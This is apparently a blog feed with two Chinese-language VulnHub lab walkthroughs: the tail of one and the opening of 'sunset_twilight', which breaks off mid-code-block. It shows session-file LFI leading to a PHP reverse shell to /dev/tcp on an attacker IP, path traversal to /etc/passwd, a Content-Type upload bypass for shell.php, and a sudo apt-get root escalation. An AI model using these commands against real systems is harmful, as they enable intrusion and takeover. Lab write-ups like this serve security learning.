部分使用的方法和当前场景好像不是很相符，不过有个点是我之前所不知道的，也就是 session 写入到临时文件中，尝试按照文章中给的路径来访问文件（这里一开始我去了 <a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt">Auto_Wordlists&#x2F;wordlists&#x2F;file_inclusion_linux.txt at main · carlospolop&#x2F;Auto_Wordlists (github.com)</a> 来找 session 的路径，但是 GitHub 上的这个路径是 <code>/var/lib/php/session/sess_&lt;sessid&gt;</code> 实际上中间的路径应该为 <code>sessions</code>，在此给自己提个醒）</p><p><img src="/pic/6e976c7a8209b2c63a6a58d73c79e13f_MD5.png"></p><p>访问成功了，文件内容并没有被清空。而且 user_pref 的值被写入到了文件中，这里是不是可以直接通过可控的 cookie 中的 user_pref 的值来 getshell，从而不需要像文章中那样构造条件竞争（因为文章中不是 user_pref 可控而是表单的值可控，而且文章中的场景是 post 请求结束文件内容会被清空）</p><p>这里我们需要将 php 反弹 shell 的代码写入到 user_pref 的值</p><p><img src="/pic/4fb023df7a44d6701b3a533fa7bc3cc1_MD5.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.1.1.128/443 0&gt;&amp;1&#x27;&quot;</span>) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>点击一下没反应，点击了两三下反弹成功了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Ted]<br>└─$ sudo nc -lvnp 443<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.139] 55052<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1571): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@ubuntu:/var/www/html$ <br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>完善 shell 并进行最基础的立足点确认和信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/www/html$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@ubuntu:/var/www/html$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@ubuntu:/var/www/html$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@ubuntu:/var/www/html$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux ubuntu 4.4.0-21-generic <span class="hljs-comment">#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@ubuntu:/var/www/html$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:39:9b:b3 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.139/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1092sec preferred_lft 1092sec<br>    inet6 fe80::524c:6803:d03d:c6c3/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>www-data@ubuntu:/var/www/html$ sudo -l<br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on ubuntu:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User www-data may run the following commands on ubuntu:<br>    (root) NOPASSWD: /usr/bin/apt-get<br></code></pre></td></tr></table></figure><p><code>sudo -l</code> 发现意外收获（以前一直觉得 www-data 用户的 <code>sudo -l</code> 没法不用密码得到返回）</p><p>使用 gtfobins 来找一下 exploit</p><p><img src="/pic/5a62e6f555eb5bce08433b671ef60c7a_MD5.png"></p><p>使用第一个竟然还会下载，下载后使用 <code>!/bin/sh</code> 开启 root 的 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/www/html$ sudo /usr/bin/apt-get changelog apt<br>sudo /usr/bin/apt-get changelog apt<br>Get:1 http://changelogs.ubuntu.com apt 1.2.35 Changelog [413 kB]<br>Fetched 413 kB <span class="hljs-keyword">in</span> 3s (133 kB/s)                          <br>WARNING: terminal is not fully functional<br>/tmp/apt-changelog-LZOMs0/apt.changelog  (press RETURN)!/bin/sh<br>!/bin/sh<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>成功获取到 root 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-comment"># ls -laih</span><br><span class="hljs-built_in">ls</span> -laih<br>total 40K<br>131075 drwx------  3 root root 4.0K Jul 16  2019 .<br>     2 drwxr-xr-x 24 root root 4.0K Jul 15  2019 ..<br>141393 -rw-------  1 root root 2.7K Jul 16  2019 .bash_history<br>134030 -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc<br>134029 drwx------  2 root root 4.0K Apr 20  2016 .cache<br>131475 -rw-------  1 root root 1.3K Jul 15  2019 .mysql_history<br>134031 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>131473 -rw-------  1 root root 9.2K Jul 16  2019 .viminfo<br></code></pre></td></tr></table></figure><p>不过没有 flag</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="哈希值的大小写问题"><a href="#哈希值的大小写问题" class="headerlink" title="哈希值的大小写问题"></a>哈希值的大小写问题</h3><p>PHP 中</p><p><img src="/pic/ef29ba45c5ae64a7bb3e30a909e1b450_MD5.png"></p><p>一般场景</p><p><img src="/pic/a1947c593c2bbe4a4064f597ffd7ec4c_MD5.png"></p><h3 id="session-LFI-实现Getshell"><a href="#session-LFI-实现Getshell" class="headerlink" title="session + LFI 实现Getshell"></a>session + LFI 实现Getshell</h3><p>除了文中主要参考的那篇文章，这篇文章写得也不错，而且关于原理说得更清楚<a href="https://www.anquanke.com/post/id/248627#h3-1">php文件包含漏洞Getshell的不同姿势-安全客 - 安全资讯平台 (anquanke.com)</a></p><blockquote><p>这里使用了 session 来保存用户会话，<a href="http://php.net/manual/zh/session.examples.basic.php">php手册</a>中是这样描述的：</p><blockquote><p>PHP 会将会话中的数据设置到 <code>$_SESSION</code> 变量中。<br>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。<br>对于文件会话保存管理器，会将会话数据保存到配置项 <code>session.save_path</code> 所指定的位置。</p></blockquote></blockquote><p>除此之外还有个小问题，就是 session 常见的存储路径，两篇文章中给的存储路径不太一样，问了下 chatgpt</p><p><img src="/pic/b58a3f00962dfcac722b19cb5768d7a6_MD5.png"></p><p>文章中还提到了和这台靶机相似的场景</p><blockquote><p>要包含并利用的话，需要能控制部分session文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p></blockquote><p>当然文中的场景更加复杂，尤其是关于 base64 编码那部分，思路很值得学习</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/5535#toc-5">浅析php文件包含及其getshell的姿势 - 先知社区 (aliyun.com)</a></p><p><a href="https://blog.csdn.net/qq_22471701/article/details/119668885">简单的PHP注册登录密码加密_php加密登录_炼气三千年的白起的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_33020901/article/details/78810035">文件读取漏洞路径收集_PD_3569的博客-CSDN博客</a></p><p><a href="https://www.anquanke.com/post/id/248627#h3-1">php文件包含漏洞Getshell的不同姿势-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sunset_twilight 靶机</title>
    <link href="/2023/08/a7cba4fd2f05.html"/>
    <url>/2023/08/a7cba4fd2f05.html</url>
    
    <content type="html"><![CDATA[<h1 id="sunset-twilight-靶机"><a href="#sunset-twilight-靶机" class="headerlink" title="sunset_twilight 靶机"></a>sunset_twilight 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_twilight]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.133      <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 09:33 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.133<br>Host is up (0.00010s latency).<br>Not shown: 65526 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>25/tcp    open  smtp<br>80/tcp    open  http<br>139/tcp   open  netbios-ssn<br>445/tcp   open  microsoft-ds<br>2121/tcp  open  ccproxy-ftp<br>3306/tcp  open  mysql<br>8080/tcp  open  http-proxy<br>63525/tcp open  unknown<br>MAC Address: 08:00:27:64:77:9F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.74 seconds<br></code></pre></td></tr></table></figure><p>开的端口还挺多的，猜测可能会有兔子洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_twilight]<br>└─$ sudo nmap -sT -sV -sC -O -p22,25,80,139,445,2121,3306,8080,63525 192.168.56.133<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 09:35 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.133<br>Host is up (0.00035s latency).<br><br>PORT      STATE SERVICE     VERSION<br>22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 43:e9:45:ec:f4:5b:ed:e9:64:47:43:43:39:96:9d:c9 (RSA)<br>|   256 ed:67:ad:31:04:17:ef:cf:75:02:05:db:88:94:97:a0 (ECDSA)<br>|_  256 ed:41:e5:d1:b2:23:2c:d5:90:59:2a:37:8b:da:31:c1 (ED25519)<br>25/tcp    open  smtp        Exim smtpd 4.92<br>| smtp-commands: twilight Hello nmap.scanme.org [192.168.56.106], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP<br>|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP<br>80/tcp    open  http        Apache httpd 2.4.38 ((Debian))<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="hljs-string">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="hljs-string">445/tcp   open  ��_      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="hljs-string">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="hljs-string">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="hljs-string">|_-rw-r--r--   1 root     root           35 Jul 16  2020 22253251-65325.twilight</span><br><span class="hljs-string">| ftp-syst: </span><br><span class="hljs-string">|   STAT: </span><br><span class="hljs-string">| FTP server status:</span><br><span class="hljs-string">|  Connected to: 192.168.56.133:2121</span><br><span class="hljs-string">|  Waiting for username.</span><br><span class="hljs-string">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="hljs-string">|  Data connection closed.</span><br><span class="hljs-string">|_End of status.</span><br><span class="hljs-string">3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="hljs-string">| mysql-info: </span><br><span class="hljs-string">|   Protocol: 10</span><br><span class="hljs-string">|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="hljs-string">|   Thread ID: 39</span><br><span class="hljs-string">|   Capabilities flags: 63486</span><br><span class="hljs-string">|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, FoundRows, Speaks41ProtocolOld, ODBCClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, IgnoreSigpipes, SupportsLoadDataLocal, LongColumnFlag, Speaks41ProtocolNew, SupportsTransactions, InteractiveClient, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</span><br><span class="hljs-string">|   Status: Autocommit</span><br><span class="hljs-string">|   Salt: f&amp;&amp;*BM;&#125;)N.9s\P^ea7/</span><br><span class="hljs-string">|_  Auth Plugin Name: mysql_native_password</span><br><span class="hljs-string">8080/tcp  open  http        PHP cli server 5.5 or later</span><br><span class="hljs-string">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="hljs-string">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="hljs-string">63525/tcp open  http        PHP cli server 5.5 or later</span><br><span class="hljs-string">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="hljs-string">MAC Address: 08:00:27:64:77:9F (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: Host: twilight; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   3:1:1: </span><br><span class="hljs-string">|_    Message signing enabled but not required</span><br><span class="hljs-string">|_clock-skew: mean: 1h19m58s, deviation: 2h18m34s, median: -2s</span><br><span class="hljs-string">| smb-os-discovery: </span><br><span class="hljs-string">|   OS: Windows 6.1 (Samba 4.9.5-Debian)</span><br><span class="hljs-string">|   Computer name: twilight</span><br><span class="hljs-string">|   NetBIOS computer name: TWILIGHT\x00</span><br><span class="hljs-string">|   Domain name: \x00</span><br><span class="hljs-string">|   FQDN: twilight</span><br><span class="hljs-string">|_  System time: 2023-08-03T09:36:22-04:00</span><br><span class="hljs-string">|_nbstat: NetBIOS name: TWILIGHT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2023-08-03T13:36:22</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 27.69 seconds</span><br></code></pre></td></tr></table></figure><p>整理下信息：Debian 操作系统；smtp 邮件服务；139, 445 smb 服务；21 ftp 服务支持匿名登陆不过只有一个文件；MySQL 服务；80, 8080, 63525 Web 服务</p><h2 id="smb-渗透"><a href="#smb-渗透" class="headerlink" title="smb 渗透"></a>smb 渗透</h2><p>尝试看看 smb 服务是否共享了目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_twilight]<br>└─$ sudo smbmap -H 192.168.56.133 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>[+] IP: 192.168.56.133:445      Name: 192.168.56.133                                    <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        WRKSHARE                                                READ ONLY       Workplace Share. Do not access <span class="hljs-keyword">if</span> not an employee.<br>        <span class="hljs-built_in">print</span>$                                                  NO ACCESS       Printer Drivers<br>        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)<br></code></pre></td></tr></table></figure><p>尝试连接 WRKSHARE 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_twilight]<br>└─$ smbclient //192.168.56.133/WRKSHARE<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Wed Jul  8 18:57:09 2020<br>  ..                                  D        0  Wed Jul  8 18:57:09 2020<br>  root                                D        0  Thu Jul 16 09:50:46 2020<br>  run                                 D        0  Thu Aug  3 09:29:50 2023<br>  lost+found                          D        0  Wed Jul  8 18:08:46 2020<br>  initrd.img                          N 25814661  Wed Jul  8 18:58:16 2020<br>  etc                                 D        0  Thu Jul 16 09:54:54 2020<br>  proc                                D        0  Thu Aug  3 09:29:52 2023<br>  vmlinuz                             N  5274864  Sun Jun  7 11:42:22 2020<br>  initrd.img.old                      N 25807574  Wed Jul  8 18:58:02 2020<br>  opt                                 D        0  Wed Jul  8 18:09:01 2020<br>  srv                                 D        0  Wed Jul  8 18:09:01 2020<br>  sys                                 D        0  Thu Aug  3 09:36:49 2023<br>  lib64                               D        0  Wed Jul  8 18:09:08 2020<br>  sbin                                D        0  Thu Jul 16 09:53:39 2020<br>  media                               D        0  Wed Jul  8 18:08:46 2020<br>  bin                                 D        0  Thu Jul 16 08:22:20 2020<br>  usr                                 D        0  Wed Jul  8 18:09:01 2020<br>  lib32                               D        0  Wed Jul  8 18:08:56 2020<br>  dev                                 D        0  Thu Aug  3 09:29:44 2023<br>  lib                                 D        0  Wed Jul  8 22:20:29 2020<br>  vmlinuz.old                         N  5274864  Mon Apr 27 01:05:39 2020<br>  libx32                              D        0  Wed Jul  8 18:08:56 2020<br>  home                                D        0  Wed Jul  8 19:15:56 2020<br>  mnt                                 D        0  Wed Jul  8 18:09:01 2020<br>  var                                 D        0  Wed Jul  8 20:03:27 2020<br>  boot                                D        0  Wed Jul  8 19:06:53 2020<br>  tmp                                 D        0  Thu Aug  3 09:34:44 2023<br><br>                7158264 blocks of size 1024. 4447488 blocks available<br></code></pre></td></tr></table></figure><p>看样子似乎挂载在了根目录，那就是说我们相当于获得了基础的文件系统读取的权限（或许还能上传）</p><p>尝试去看了看 home 目录，发现了一个用户 <code>miguel</code> 但是没有读取此用户家目录的权限</p><p>接下来考虑去看看网站目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \var\www\html\&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Thu Jul 16 09:43:26 2020<br>  ..                                  D        0  Wed Jul 15 21:44:37 2020<br>  current.php                         N      152  Wed Jul 15 21:58:35 2020<br>  lang.php                            N       58  Wed Jul 15 22:03:45 2020<br>  gallery                             D        0  Wed Jul  8 22:31:53 2020<br>  index.php                           N      228  Wed Jul 15 22:03:51 2020<br><br>                7158264 blocks of size 1024. 4447472 blocks available<br></code></pre></td></tr></table></figure><p>将上述文件依次下载到本地，然后开始观察文件中的代码，同时结合浏览器的显示来辅助判断</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p><code>lang.php</code> 是比较有意思的，代码如下所示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$lang</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lang&#x27;</span>];<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;./&#x27;</span> . <span class="hljs-variable">$lang</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>应当是存在文件包含的，尝试本地文件包含，构造 PoC</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.133</span><span class="hljs-regexp">/lang.php?lang=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p>的确可以访问 passwd 文件但是无法访问 shadow 文件</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>而 gallery 文件夹中是上传文件的，浏览器中的显示如下</p><p><img src="/pic/c5e7e2282bd11a0c76bc2f0e8dcf5f67_MD5.png"></p><p>结合通过 smb 下载的文件来进行简单的代码审计，在 <code>maxlmageUpload.class.php</code> 的第 117 行找到了关于文件上传类型的判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//Check image type. Only jpeg images are allowed</span><br>          <span class="hljs-keyword">if</span> ( ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>])==<span class="hljs-string">&#x27;image/pjpeg&#x27;</span>) || ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;myfile&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>])==<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)) &#123;<br></code></pre></td></tr></table></figure><p>只是很简单地检查了 Content-Type，那我们可以上传一个真正的 jpg 文件，并使用 burp suite 抓包，再将其中的文件名和文件内容进行修改</p><p><img src="/pic/5534d9092650475015d3860000783f73_MD5.png"></p><p>可以在 Response 体中看到上传成功的文件名，回到 smb 命令行中，获取文件路径的相关信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \var\www\html\gallery\&gt; <span class="hljs-built_in">cd</span> original<br>smb: \var\www\html\gallery\original\&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Thu Aug  3 21:54:42 2023<br>  ..                                  D        0  Wed Jul  8 22:31:53 2020<br>  sandwich.jpg                        N   171858  Thu Aug  3 21:53:06 2023<br>  espresso.jpg                        N   170467  Thu Aug  3 21:53:17 2023<br>  shell.php                           N     3611  Thu Aug  3 21:54:42 2023<br></code></pre></td></tr></table></figure><p>尝试直接访问 <code>http://192.168.56.133/gallery/original/shell.php</code>，如果不成功的话，可以结合刚才的本地文件包含漏洞来进一步尝试。</p><h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>提前开启监听后，访问链接就实现了反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 